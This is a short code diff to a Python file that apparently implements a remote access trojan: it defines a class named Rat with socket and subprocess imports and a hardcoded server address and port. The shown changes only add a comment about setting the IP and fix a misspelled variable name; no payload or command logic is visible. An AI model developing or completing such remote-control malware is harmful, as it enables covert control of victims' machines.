@@ -2,6 +2,7 @@ import socket
 import subprocess
 import os
 
+# Change this IP for your local network
 SERVER = '192.168.100.16'
 PORT = 5050
 ADDR = (SERVER, PORT)
@@ -84,8 +85,8 @@ class Rat:
         except:
             pass
         try:
-            responde = self.RAT.recv(RAW_ERROR)
-            return responde
+            response = self.RAT.recv(RAW_ERROR)
+            return response
         except:
             return 0
 
